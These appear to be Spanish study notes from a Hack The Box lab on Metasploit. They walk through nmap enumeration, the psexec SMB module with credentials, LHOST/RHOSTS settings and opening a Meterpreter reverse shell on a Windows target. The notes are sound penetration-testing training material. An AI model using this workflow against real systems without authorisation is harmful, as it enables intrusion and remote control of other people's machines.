
## 1. ¿Qué es Metasploit?

**Metasploit Framework** es una herramienta desarrollada por Rapid7 que automatiza la explotación de vulnerabilidades mediante módulos preconfigurados.

Permite:

- Buscar vulnerabilidades y módulos de explotación.
    
- Escanear y enumerar objetivos.
    
- Ejecutar exploits.
    
- Configurar y entregar payloads.
    
- Establecer sesiones de shell mediante payloads como Meterpreter.
    

**Importante:** debemos comprender las acciones de las herramientas que utilizamos, especialmente durante auditorías reales.

### Iniciar Metasploit

```
sudo msfconsole
```

El prompt cambia al entrar en la consola:

```
msf6 >
```

Los números de exploits, payloads y módulos que aparecen al iniciar pueden variar según la versión de Metasploit.

## 2. Enumeración y búsqueda de módulos

Antes de seleccionar un exploit, debemos identificar los servicios del objetivo.

### Escaneo con Nmap

```
nmap -sC -sV -Pn <IP_OBJETIVO>
```

- `-sC`: ejecuta los scripts predeterminados.
    
- `-sV`: identifica las versiones de los servicios.
    
- `-Pn`: omite el descubrimiento de hosts y trata el objetivo como activo.
    

Ejemplo de servicios encontrados en un sistema Windows:

|Puerto|Servicio|Información|
|---|---|---|
|`135/tcp`|MSRPC|Microsoft Windows RPC|
|`139/tcp`|NetBIOS-SSN|Servicio NetBIOS|
|`445/tcp`|SMB|Compartición de archivos de Windows|

El puerto `445/tcp` puede ser un vector de ataque potencial si identificamos una vulnerabilidad o disponemos de credenciales y permisos adecuados.

### Buscar módulos en Metasploit

```
msf6 > search smb
```

Este comando muestra módulos relacionados con SMB.

Los resultados incluyen:

|Campo|Significado|
|---|---|
|`#`|Número temporal asignado al resultado de búsqueda.|
|`Name`|Nombre y ruta del módulo.|
|`Disclosure Date`|Fecha de divulgación de la vulnerabilidad, cuando corresponda.|
|`Rank`|Valoración de fiabilidad del exploit.|
|`Check`|Indica si el módulo admite una comprobación de vulnerabilidad.|
|`Description`|Descripción de la funcionalidad del módulo.|

**Importante:** el número de la columna `#` puede cambiar entre búsquedas y versiones. Es preferible reconocer el módulo por su nombre.

## 3. Seleccionar un módulo

En el ejemplo de HTB se utiliza el módulo `psexec` para Windows y SMB.

```
msf6 > use exploit/windows/smb/psexec
```

También puede seleccionarse mediante el número que aparezca en la búsqueda:

```
msf6 > use <NUMERO>
```

Si no se especifica otro payload, Metasploit puede seleccionar uno predeterminado. En el ejemplo, utiliza:

```
windows/meterpreter/reverse_tcp
```

### Interpretar el nombre del módulo

```
exploit/windows/smb/psexec
```

- `exploit`: tipo de módulo.
    
- `windows`: plataforma objetivo.
    
- `smb`: servicio utilizado como vector de ataque.
    
- `psexec`: nombre del módulo de explotación.
    

El módulo del ejemplo permite ejecutar un payload en un sistema Windows utilizando credenciales válidas y SMB.

---

## 4. Consultar las opciones

Una vez seleccionado el módulo:

```
msf6 exploit(windows/smb/psexec) > options
```

Este comando muestra las opciones de configuración del módulo, las del payload y los objetivos disponibles.

### Opciones principales del exploit

|Opción|Función|
|---|---|
|`RHOSTS`|IP, rango o lista de hosts objetivo.|
|`RPORT`|Puerto del servicio remoto; en el ejemplo, `445`.|
|`SMBUser`|Usuario utilizado para autenticarse mediante SMB.|
|`SMBPass`|Contraseña del usuario.|
|`SMBDomain`|Dominio de Windows utilizado para la autenticación.|
|`SHARE`|Recurso compartido SMB utilizado por el módulo.|
|`SERVICE_NAME`|Nombre del servicio que se creará, si corresponde.|
|`SERVICE_DISPLAY_NAME`|Nombre visible del servicio.|
|`SERVICE_DESCRIPTION`|Descripción del servicio.|

### Opciones del payload

|Opción|Función|
|---|---|
|`LHOST`|Dirección local en la que se espera recibir la conexión inversa.|
|`LPORT`|Puerto en el que escuchará el handler.|
|`EXITFUNC`|Técnica utilizada cuando termina la ejecución del payload.|

**RHOSTS y LHOST no son lo mismo:**

- `RHOSTS`: dirección del objetivo.
    
- `LHOST`: dirección del equipo atacante a la que debe conectarse el payload.
    

Si trabajamos mediante una VPN, debemos seleccionar una dirección del equipo atacante que sea alcanzable desde el objetivo, como la correspondiente a la interfaz VPN.

---

## 5. Configurar las opciones

En Metasploit se utiliza `set` para establecer el valor de una opción.

Ejemplo de la sintaxis utilizada en el laboratorio:

```
set RHOSTS <IP_OBJETIVO>
set SHARE ADMIN$
set SMBUser <USUARIO>
set SMBPass <CONTRASEÑA>
set LHOST <IP_ATACANTE>
```

Los valores deben adaptarse al laboratorio:

- `RHOSTS`: IP del objetivo.
    
- `SHARE`: recurso compartido al que se accederá.
    
- `SMBUser` y `SMBPass`: credenciales válidas.
    
- `LHOST`: IP del atacante alcanzable desde el objetivo.
    

El recurso `ADMIN$` es un recurso administrativo de Windows. Su acceso depende de los permisos y las credenciales utilizados.

Para comprobar la configuración, podemos volver a ejecutar:

```
options
```

## 6. Ejecutar el exploit

Una vez configuradas las opciones:

```
exploit
```

Metasploit intentará ejecutar el módulo y entregar el payload.

Durante el proceso puede mostrar mensajes relacionados con:

1. El inicio del handler TCP inverso.
    
2. La conexión al servicio SMB.
    
3. La autenticación con las credenciales configuradas.
    
4. La ejecución del payload.
    
5. La recepción de las fases del payload.
    
6. La apertura de una sesión.
    

Una salida como esta indica que se ha establecido una sesión:

```
Meterpreter session 1 opened
meterpreter >
```

El resultado depende de que el objetivo sea vulnerable o de que las credenciales, permisos y opciones utilizadas permitan ejecutar el módulo correctamente.

## 7. Meterpreter

**Meterpreter** es un payload de Metasploit que proporciona una interfaz para interactuar con el sistema comprometido.

Entre sus capacidades se encuentran:

- Ejecutar comandos.
    
- Subir y descargar archivos.
    
- Gestionar procesos.
    
- Administrar servicios.
    
- Utilizar funcionalidades adicionales de postexplotación.
    

En el ejemplo del módulo `psexec`, Metasploit utiliza `windows/meterpreter/reverse_tcp`, un payload por fases (_staged_).

Una salida como:

```
Sending stage (...)
Meterpreter session 1 opened
```

indica que se ha enviado una fase del payload y que la sesión se ha abierto correctamente.

Meterpreter también puede utilizar técnicas de inyección de DLL en memoria para ejecutar su funcionalidad.

### Consultar los comandos disponibles

Desde la sesión:

```
meterpreter > ?
```

Muestra los comandos disponibles en la interfaz de Meterpreter.

### Acceder a una shell del sistema

Si necesitamos utilizar los comandos nativos de Windows:

```
meterpreter > shell
```

Esto abre una shell del sistema operativo, por ejemplo:

```
C:\WINDOWS\system32>
```

A diferencia de Meterpreter, aquí podremos utilizar comandos propios de Windows, como `dir`, `whoami` o `ipconfig`.

## 8. Flujo de trabajo con Metasploit

Secuencia general del procedimiento mostrado en el módulo:

1. **Enumerar:** identificar puertos y servicios con Nmap.
    
2. **Buscar:** utilizar `search` para localizar módulos relacionados con el servicio.
    
3. **Seleccionar:** cargar el módulo mediante `use`.
    
4. **Inspeccionar:** consultar las opciones con `options`.
    
5. **Configurar:** establecer los parámetros necesarios con `set`.
    
6. **Ejecutar:** lanzar el módulo con `exploit`.
    
7. **Verificar:** comprobar si se ha abierto una sesión.
    
8. **Interactuar:** utilizar Meterpreter o acceder a una shell del sistema.
    

### Comandos esenciales

|Comando|Función|
|---|---|
|`sudo msfconsole`|Iniciar Metasploit con privilegios de administrador.|
|`search smb`|Buscar módulos relacionados con SMB.|
|`use <MODULO>`|Seleccionar un módulo.|
|`options`|Consultar las opciones de configuración.|
|`set <OPCION> <VALOR>`|Establecer el valor de una opción.|
|`exploit`|Ejecutar el módulo seleccionado.|
|`?`|Mostrar los comandos disponibles en Meterpreter.|
|`shell`|Abrir una shell del sistema desde Meterpreter.|

## 9. Puntos clave para el examen

- Metasploit automatiza la explotación mediante módulos.
    
- La enumeración previa ayuda a identificar el servicio y seleccionar el módulo adecuado.
    
- `search` busca módulos y `use` selecciona uno.
    
- `options` muestra los parámetros que deben configurarse.
    
- `RHOSTS` identifica el objetivo; `LHOST` indica dónde se espera recibir la conexión inversa.
    
- El módulo `exploit/windows/smb/psexec` del ejemplo utiliza SMB y credenciales válidas para ejecutar un payload en Windows.
    
- Meterpreter ofrece más funcionalidades que una shell de comandos básica.
    
- `?` permite consultar los comandos de Meterpreter.
    
- `shell` permite pasar a una shell del sistema operativo.
    
- La apertura de una sesión de Meterpreter confirma que se ha establecido una sesión con éxito.
    
- Comprender el funcionamiento del módulo es tan importante como saber ejecutarlo.
